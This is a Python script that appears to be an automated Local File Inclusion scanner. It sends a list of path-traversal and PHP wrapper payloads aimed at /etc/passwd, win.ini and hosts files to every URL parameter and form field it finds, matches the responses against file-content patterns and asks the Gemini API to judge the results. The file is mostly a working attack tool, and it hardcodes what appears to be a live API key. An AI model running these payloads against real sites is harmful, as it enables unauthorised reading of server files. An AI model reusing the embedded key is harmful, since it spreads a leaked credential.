import os
import requests
import urllib.parse
import json
import time
import random
import string
import re
from concurrent.futures import ThreadPoolExecutor

# Gemini API configuration
GEMINI_API_KEY = "AIzaSyBRD2TjLNSV5LnTfD38DIy5CWjQy4SGJ_M"
GEMINI_API_URL = "https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent"

# LFI payloads to test
LFI_PAYLOADS = [
    "../../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "../../../../../../../etc/passwd%00",
    "../../../../../../../../etc/passwd%00",
    "..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
    "....//....//....//....//....//....//etc/passwd",
    "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
    "/etc/passwd",
    "file:///etc/passwd",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/read=convert.base64-encode/resource=/etc/passwd",
    "php://filter/resource=/etc/passwd",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "../../../../../../../../Windows/System32/drivers/etc/hosts",
    "..\\..\\..\\..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
    "..%5c..%5c..%5c..%5c..%5c..%5cWindows%5cSystem32%5cdrivers%5cetc%5chosts",
    "file:///C:/Windows/System32/drivers/etc/hosts",
    "C:\\Windows\\win.ini",
    "../../../../../../../../Windows/win.ini",
    "..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini"
]

# Patterns to detect successful LFI
LFI_PATTERNS = [
    # Linux /etc/passwd patterns
    "root:x:0:0:",
    "bin:x:",
    "daemon:x:",
    "nobody:x:",
    "sync:x:",
    # Windows patterns
    "[fonts]",
    "[extensions]",
    "[files]",
    "[Mail]",
    "[MCI Extensions]",
    # Windows hosts file patterns
    "127.0.0.1",
    "localhost",
    "# Copyright (c) 1993-2009 Microsoft Corp.",
    # PHP source code patterns
    "<?php",
    "function",
    "class",
    "namespace",
    "use ",
    # Apache config patterns
    "ServerRoot",
    "DocumentRoot",
    "DirectoryIndex",
    "AllowOverride",
    # General file content patterns
    "Permission denied",
    "No such file or directory",
    "failed to open stream",
    "open_basedir restriction in effect"
]

# Headers for HTTP requests
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive',
}

def generate_random_string(length=8):
    """Generate a random string for testing."""
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def extract_urls_with_params(file_path):
    """Extract URLs with parameters from a file."""
    urls = []
    try:
        with open(file_path, 'r') as file:
            for line in file:
                url = line.strip()
                if url and '?' in url:  # Make sure URL is not empty and has parameters
                    urls.append(url)
    except Exception as e:
        print(f"Error reading file: {e}")
    
    print(f"Found {len(urls)} URLs with parameters to test.")
    return urls

def check_for_lfi_patterns(response_text):
    """Check if the response contains patterns indicating successful LFI."""
    for pattern in LFI_PATTERNS:
        if pattern in response_text:
            return True, pattern
    return False, None

def analyze_with_gemini(url, payload, response_content, original_content):
    """
    Use Gemini API to analyze if the LFI payload is likely to be successful.
    """
    # First, check for common LFI patterns
    has_pattern, pattern = check_for_lfi_patterns(response_content)
    if has_pattern:
        return True, f"VULNERABLE: LFI pattern detected: {pattern}"
    
    # Check for significant differences in response
    if len(response_content) != len(original_content) and abs(len(response_content) - len(original_content)) > 100:
        return True, f"VULNERABLE: Significant difference in response length ({len(response_content)} vs {len(original_content)})"
    
    # Use Gemini for more advanced analysis
    prompt = f"""
    I need to analyze if this Local File Inclusion (LFI) payload is likely to be successful based on the following response.
    
    URL: {url}
    Payload: {payload}
    
    Original Response Length: {len(original_content)}
    Modified Response Length: {len(response_content)}
    
    Modified Response (truncated if necessary):
    {response_content[:4000]}
    
    Please analyze if:
    1. There are any signs of successful file inclusion (e.g., file contents, system information)
    2. There are any error messages that might indicate a partial success
    3. The response structure has changed significantly compared to a normal response
    
    Respond with only "VULNERABLE" or "NOT VULNERABLE" followed by a brief explanation.
    """
    
    api_url = f"{GEMINI_API_URL}?key={GEMINI_API_KEY}"
    
    data = {
        "contents": [
            {
                "parts": [
                    {"text": prompt}
                ]
            }
        ],
        "generationConfig": {
            "temperature": 0.1,
            "maxOutputTokens": 200
        }
    }
    
    try:
        response = requests.post(api_url, json=data)
        if response.status_code == 200:
            result = response.json()
            if "candidates" in result and len(result["candidates"]) > 0:
                text = result["candidates"][0]["content"]["parts"][0]["text"]
                is_vulnerable = text.strip().startswith("VULNERABLE")
                explanation = text.strip()
                return is_vulnerable, explanation
        return False, "Error analyzing response with Gemini"
    except Exception as e:
        return False, f"Error calling Gemini API: {str(e)}"

def test_url_for_lfi(url):
    """Test a URL for LFI vulnerabilities."""
    print(f"Testing URL: {url}")
    results = []
    
    try:
        # Parse the URL to get parameters
        parsed_url = urllib.parse.urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        # If no parameters in URL, try to find form fields
        if not query_params:
            try:
                print(f"No query parameters found, checking for forms in {url}")
                response = requests.get(url, headers=HEADERS, timeout=10)
                
                # Simple form field extraction
                form_fields = []
                if '<form' in response.text.lower():
                    # Extract input fields from forms
                    input_pattern = r'<input.*?name=["\']([^"\']+)["\']'
                    form_fields = re.findall(input_pattern, response.text, re.IGNORECASE)
                    
                    if form_fields:
                        print(f"Found {len(form_fields)} form fields: {', '.join(form_fields)}")
                        
                        # Test each form field with LFI payloads
                        for field in form_fields:
                            # First get a baseline response
                            normal_value = generate_random_string()
                            test_data = {field: normal_value}
                            
                            try:
                                normal_response = requests.post(url, data=test_data, headers=HEADERS, timeout=10)
                                normal_content = normal_response.text
                                
                                # Test LFI payloads
                                for payload in LFI_PAYLOADS:
                                    lfi_data = {field: payload}
                                    lfi_response = requests.post(url, data=lfi_data, headers=HEADERS, timeout=10)
                                    
                                    # Check for LFI patterns
                                    has_pattern, pattern = check_for_lfi_patterns(lfi_response.text)
                                    
                                    if has_pattern:
                                        print(f"Potential LFI found in form field {field} with payload {payload}")
                                        results.append({
                                            'url': url,
                                            'param': f"form:{field}",
                                            'payload': payload,
                                            'status': 'Potential LFI Vulnerability (Form)',
                                            'analysis': f"LFI pattern detected: {pattern}"
                                        })
                                        break
                                    
                                    # If no obvious pattern, use Gemini for analysis
                                    is_vulnerable, explanation = analyze_with_gemini(url, payload, lfi_response.text, normal_content)
                                    
                                    if is_vulnerable:
                                        results.append({
                                            'url': url,
                                            'param': f"form:{field}",
                                            'payload': payload,
                                            'status': 'Potential LFI Vulnerability (Form)',
                                            'analysis': explanation
                                        })
                                        break
                            except Exception as e:
                                print(f"Error testing form field {field}: {e}")
                                continue
            except Exception as e:
                print(f"Error checking for forms: {e}")
            
            return results
        
        # Test each parameter individually
        for param, values in query_params.items():
            print(f"Testing parameter: {param}")
            
            # Get a baseline response with a normal value
            normal_value = generate_random_string()
            test_params = {p: values[0] for p, values in query_params.items()}
            test_params[param] = normal_value
            test_url = f"{base_url}?{urllib.parse.urlencode(test_params, doseq=True)}"
            
            try:
                normal_response = requests.get(test_url, headers=HEADERS, timeout=10)
                normal_content = normal_response.text
                
                # Test LFI payloads
                for payload in LFI_PAYLOADS:
                    lfi_params = {p: values[0] for p, values in query_params.items()}
                    lfi_params[param] = payload
                    lfi_url = f"{base_url}?{urllib.parse.urlencode(lfi_params, doseq=True)}"
                    
                    try:
                        lfi_response = requests.get(lfi_url, headers=HEADERS, timeout=10)
                        
                        # Check for LFI patterns
                        has_pattern, pattern = check_for_lfi_patterns(lfi_response.text)
                        
                        if has_pattern:
                            print(f"Potential LFI found in parameter {param} with payload {payload}")
                            results.append({
                                'url': url,
                                'param': param,
                                'payload': payload,
                                'status': 'Potential LFI Vulnerability',
                                'analysis': f"LFI pattern detected: {pattern}"
                            })
                            break
                        
                        # Use Gemini for more advanced analysis
                        is_vulnerable, explanation = analyze_with_gemini(lfi_url, payload, lfi_response.text, normal_content)
                        
                        if is_vulnerable:
                            print(f"Potential LFI found in parameter {param} with payload {payload}")
                            results.append({
                                'url': url,
                                'param': param,
                                'payload': payload,
                                'status': 'Potential LFI Vulnerability',
                                'analysis': explanation
                            })
                            break
                    except Exception as e:
                        print(f"Error testing LFI payload: {e}")
                        continue
            except Exception as e:
                print(f"Error testing parameter {param}: {e}")
        
    except Exception as e:
        print(f"Error processing URL {url}: {e}")
    
    return results

def scan_lfi(params_file_path, max_workers=3):
    """
    Scan URLs with parameters for LFI vulnerabilities.
    
    Args:
        params_file_path: Path to the file containing URLs with parameters
        max_workers: Maximum number of concurrent workers
    
    Returns:
        List of potential LFI vulnerabilities
    """
    if not os.path.exists(params_file_path):
        print(f"File not found: {params_file_path}")
        return []
    
    urls = extract_urls_with_params(params_file_path)
    if not urls:
        print("No URLs with parameters found in the file.")
        return []
    
    print(f"Found {len(urls)} URLs with parameters to test.")
    
    # Process URLs in smaller batches to show progress
    batch_size = 5
    all_results = []
    
    for i in range(0, len(urls), batch_size):
        batch = urls[i:i+batch_size]
        print(f"\nProcessing batch {i//batch_size + 1}/{(len(urls) + batch_size - 1)//batch_size}...")
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            results = list(executor.map(test_url_for_lfi, batch))
            
            for result in results:
                all_results.extend(result)
                
        # Show intermediate results
        if all_results:
            print(f"Found {len(all_results)} potential vulnerabilities so far")
    
    # Save results to file
    output_dir = os.path.dirname(params_file_path)
    domain = os.path.basename(params_file_path).split('_')[0]
    output_file = os.path.join(output_dir, f"{domain}_lfi_results.txt")
    
    with open(output_file, 'w') as f:
        if all_results:
            f.write("LFI Vulnerability Scan Results\n")
            f.write("=======================================\n\n")
            
            for result in all_results:
                f.write(f"URL: {result['url']}\n")
                f.write(f"Parameter: {result['param']}\n")
                f.write(f"Payload: {result['payload']}\n")
                f.write(f"Status: {result['status']}\n")
                f.write(f"Analysis: {result['analysis']}\n")
                f.write("-----------------------------\n\n")
        else:
            f.write("No LFI vulnerabilities found.\n")
    
    return all_results

def test_specific_parameter(param_name, target_url=None):
    """Test a specific parameter for LFI vulnerabilities."""
    if not target_url:
        target_url = "http://testphp.vulnweb.com/listproducts.php"
    
    url = f"{target_url}?{param_name}=test"
    print(f"Testing parameter '{param_name}' on URL: {url}")
    
    results = []
    
    try:
        # Get a baseline response
        normal_response = requests.get(url, headers=HEADERS, timeout=10)
        normal_content = normal_response.text
        
        # Test LFI payloads
        for payload in LFI_PAYLOADS:
            lfi_url = f"{target_url}?{param_name}={urllib.parse.quote(payload)}"
            
            try:
                lfi_response = requests.get(lfi_url, headers=HEADERS, timeout=10)
                
                # Check for LFI patterns
                has_pattern, pattern = check_for_lfi_patterns(lfi_response.text)
                
                if has_pattern:
                    print(f"Potential LFI found with payload {payload}")
                    results.append({
                        'url': target_url,
                        'param': param_name,
                        'payload': payload,
                        'status': 'Potential LFI Vulnerability',
                        'analysis': f"LFI pattern detected: {pattern}"
                    })
                    break
                
                # If no obvious pattern, use Gemini for analysis
                is_vulnerable, explanation = analyze_with_gemini(lfi_url, payload, lfi_response.text, normal_content)
                
                if is_vulnerable:
                    print(f"Potential LFI found with payload {payload}")
                    results.append({
                        'url': target_url,
                        'param': param_name,
                        'payload': payload,
                        'status': 'Potential LFI Vulnerability',
                        'analysis': explanation
                    })
                    break
            except Exception as e:
                print(f"Error testing LFI payload: {e}")
    
    except Exception as e:
        print(f"Error testing parameter: {e}")
    
    return results

if __name__ == "__main__":
    # For testing the script directly
    import sys
    
    if len(sys.argv) > 1:
        file_path = sys.argv[1]
        
        # Check if it's a direct parameter test
        if '=' in file_path and not os.path.exists(file_path):
            param_name = file_path.split('=')[0]
            target_url = None
            if len(sys.argv) > 2:
                target_url = sys.argv[2]
            
            results = test_specific_parameter(param_name, target_url)
            
            if results:
                print(f"\nFound {len(results)} potential LFI vulnerabilities!")
                for result in results:
                    print(f"\nURL: {result['url']}")
                    print(f"Parameter: {result['param']}")
                    print(f"Payload: {result['payload']}")
                    print(f"Status: {result['status']}")
                    print(f"Analysis: {result['analysis']}")
            else:
                print("\nNo LFI vulnerabilities found.")
        else:
            print(f"Scanning file: {file_path}")
            results = scan_lfi(file_path)
            
            if results:
                print(f"\nFound {len(results)} potential LFI vulnerabilities!")
                for result in results:
                    print(f"\nURL: {result['url']}")
                    print(f"Parameter: {result['param']}")
                    print(f"Payload: {result['payload']}")
                    print(f"Status: {result['status']}")
                    print(f"Analysis: {result['analysis']}")
            else:
                print("\nNo LFI vulnerabilities found.")
    else:
        print("Usage: python lfi_test.py <path_to_params_file_or_parameter>")
        print("Examples:")
        print("  python lfi_test.py C:\\Users\\begad\\OneDrive\\Desktop\\Recon-test\\crawler\\example.com_params.txt")
        print("  python lfi_test.py file=test http://testphp.vulnweb.com/showimage.php")